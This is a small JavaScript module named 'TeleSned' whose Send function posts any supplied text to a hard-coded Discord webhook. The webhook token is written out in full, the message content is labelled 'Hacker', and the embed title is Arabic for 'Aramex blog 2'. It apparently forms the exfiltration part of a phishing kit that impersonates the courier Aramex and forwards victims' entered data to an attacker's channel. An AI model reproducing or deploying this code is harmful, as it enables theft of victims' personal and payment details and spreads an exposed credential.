import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1325021102266650674/d0Hak0MkNQ_zAQYp3owwHfFo3DKjsyBTuehVJt5JtdRs9xMNZsuwpmE3Uwge2FMlaHoV",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
